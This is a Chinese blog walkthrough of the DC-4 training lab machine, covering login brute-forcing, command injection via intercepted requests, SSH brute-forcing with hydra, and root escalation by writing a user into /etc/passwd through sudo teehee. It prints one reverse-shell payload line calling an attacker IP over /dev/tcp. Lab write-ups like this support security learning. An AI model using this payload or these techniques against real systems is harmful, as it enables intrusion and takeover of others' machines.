---
link: https://blog.csdn.net/2403_88102829/article/details/157027804
title: dc4打靶报告
description: 记录 DC-4 靶机从网络发现、命令执行流量分析、凭据查找到无密码 sudo 配置利用的提权过程。
excerpt: 记录 DC-4 靶机从网络发现、命令执行流量分析、凭据查找到无密码 sudo 配置利用的提权过程。
keywords: 服务器,网络,运维
author: Lee
date: 2026-01-28T07:30:04.346Z
categories:
  - 靶场复现
tags:
  - DC靶场
  - Linux
  - 提权
---

先arp-scan -l 扫局域网内存活主机

![](https://i-blog.csdnimg.cn/direct/a67283c596f647e1a29ef52171ded76c.png)

发现疑似靶机ip，开始探测

![](https://i-blog.csdnimg.cn/direct/052ecf4749bd4eec997909320f0eb635.png)

![](https://i-blog.csdnimg.cn/direct/ce020f16c2c84f27b739bf68586753a0.png)

![](https://i-blog.csdnimg.cn/direct/22a8a8af9e08482192e5a8a79f31e8e3.png)

![](https://i-blog.csdnimg.cn/direct/62329a1868b64635b1934600a4618fae.png)

![](https://i-blog.csdnimg.cn/direct/a0ab6f38d56d44f9a12d4be094eafa76.png)

![](https://i-blog.csdnimg.cn/direct/fbecfd27b9744610bb3068504d87d0ab.png)

start attrack攻击最后得到密码happy

![](https://i-blog.csdnimg.cn/direct/89d44863aa9e412b9b346d4e1e4276be.png)

command进去，发现不同的选项run了之后，select后面会对应一些命令行，所以可以推测run了之后终端会执行对应的命令行

![](https://i-blog.csdnimg.cn/direct/154f917222bd453dbab882a7d67757c0.png)

所以run的时候抓包看一下，找到了命令行的地方

![](https://i-blog.csdnimg.cn/direct/766e3f8885584d828ee276076150f678.png)

send to repeater试一下其他命令

whoami回显成功

![](https://i-blog.csdnimg.cn/direct/91d07d65a68f4ad9875c7767f5710af2.png)

kali连反弹shell

![](https://i-blog.csdnimg.cn/direct/7b48f19527b94c319cb68898e2f17993.png)

把bash命令行写到这里面，然后放包

注意：前面观察ls的时候，数据包里面传输的命令行把空格都换成了加号+

所以我们的bash命令是这样的

```
bash+-c+'bash+-i+>&+/dev/tcp/192.168.145.128/1234+0>&1'
```

修改之后forward放包

连接成功

![](https://i-blog.csdnimg.cn/direct/2e17aae2f47244898cc51956729f6f0c.png)

到处看看有什么有用的

![](https://i-blog.csdnimg.cn/direct/4208cc7c03cd4dc9990e02944721e94e.png)

几个名字下都是空，jim用户里有东西，继续进到backups里面还有一个old-passwords.bak文件

![](https://i-blog.csdnimg.cn/direct/946744475a0341dcbeb9a3ddf2266e4d.png)

cat后发现是一个密码列表

![](https://i-blog.csdnimg.cn/direct/356574d375bc4e9f8e65df6c616f7803.png)

重新开一个攻击终端，把密码列表copy过去

![](https://i-blog.csdnimg.cn/direct/1d05a18c6a62493fb2877d7123e6fef6.png)

hydra爆破

![](https://i-blog.csdnimg.cn/direct/de92150427644430a97083d9dd5c0efb.png)

爆破出来jim的密码是jibril04

远程连接成功，看到回显里面有个提示

**"You have mail"**

![](https://i-blog.csdnimg.cn/direct/05afce62c2784a3bbca230b7ab8dbe88.png)

猜测是不是让找mail文件，ls看一下

![](https://i-blog.csdnimg.cn/direct/9d95ef448e2b42618547ed97ff2cf3c3.png)

果然有一封来着另一个用户charles的mail

![](https://i-blog.csdnimg.cn/direct/e2d7ecb1be544c59ac8484fbe7de30d7.png)

给了密码，直接su到charles用户下，切换成功![](https://i-blog.csdnimg.cn/direct/8f00a65b53c7463085d795d278d1c176.png)

我们看一下这个账号能用root权限做什么

![](https://i-blog.csdnimg.cn/direct/181b1407e0ff4402a24b631b02b1bc0d.png)

这里，说明用户 charles 可以无需密码，以 root 权限执行 /usr/bin/teehee 命令

开始提权——passwd文件注入提权

用这个命令添加一个免密的root666用户

![](https://i-blog.csdnimg.cn/direct/9b7b437e529e45699b779c47c6a29d3f.png)

检查，写入成功了

![](https://i-blog.csdnimg.cn/direct/f786ae9a88e7468e883e2df71d07ba94.png)

切换过去，成功了

![](https://i-blog.csdnimg.cn/direct/f466b6049aa340318c9f747b8f093011.png)

找到flag文件![](https://i-blog.csdnimg.cn/direct/21367127cf154df49f23c361281102a8.png)

成功！

![](https://i-blog.csdnimg.cn/direct/79f74e61a640415493171091a3b46ae0.png)

完结撒花！！！
